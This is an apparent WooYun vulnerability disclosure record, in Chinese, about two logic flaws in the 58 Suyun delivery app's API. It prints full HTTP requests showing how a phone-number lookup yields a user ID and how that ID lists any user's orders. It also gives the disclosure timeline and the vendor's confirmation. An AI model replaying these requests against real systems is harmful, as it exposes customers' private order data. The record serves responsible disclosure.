{"id": 75262, "wybug_id": "wooyun-2016-0168059", "wybug_title": "58速运两处设计缺陷导致订单遍历/历史问题", "wybug_corp": "58同城", "wybug_author": "路人甲", "wybug_date": "2016-01-07 15:16", "wybug_open_date": "2016-02-20 15:48", "wybug_type": "设计缺陷/逻辑错误", "wybug_level": "高", "wybug_rank_0": "15", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2016-01-07：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2016-01-07：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2016-01-17：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2016-01-27：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2016-02-06：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2016-02-20：\t细节向公众公开  简要描述： 58速运两处设计缺陷导致订单遍历/历史问题未完全修复都过去一个季度了 详细说明：  1、先看看订单遍历，\n\n\n\n看看这个请求\nPOST /api/guest/order/list HTTP/1.1cookie: nullversion: 3.6imei: 865800028648506i: 1c: number: 0daojiasuyuntoken: Content-Length: 116Content-Type: application/x-www-form-urlencodedHost: suyun.guest.daojia.comConnection: Keep-AliveUser-Agent: 58suyunandroid3.6Accept-Encoding: gzip,deflatemobile_version: 5.1.1mobile_board: A0001common_lng=&cityid=&mobile=18888888888&uid=633887946189185024&common_lat=&r=&realcityid=&page=&pagesize=&channel-id=\n手机号码和UID，没有其他的了，其中手机号码任意即可，只要uid正确即可，那么这么长的uid咋来的呢，2、找到uid\n\n有这样一个接口\nGET /api/guest/mobile/bind?type=5&uid=&mobile=13184390430&r=0.2850908009537293&cityid=&realcityid= HTTP/1.1cookie: nullversion: 3.6imei: 865800028648506i: 1c: number: 0daojiasuyuntoken: Host: suyun.guest.daojia.comConnection: Keep-AliveUser-Agent: 58suyunandroid3.6Accept-Encoding: gzip,deflatemobile_version: 5.1.1mobile_board: A0001\n结果\n\n还是和上个漏洞一样，对于未注册的用户也有影响   漏洞证明：     修复方案：     版权声明：转载请注明来源 路人甲@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：中 漏洞Rank：8  确认时间：2016-01-07 15:22 厂商回复： 感谢对58安全的关注，已反馈给到家的同学。 最新状态： 暂无  ", "replys": "漏洞评价：\n评价\n  \n\n\n", "wybug_level_fromcorp": "中", "wybug_rank_fromcorp": 8, "Ranks": null}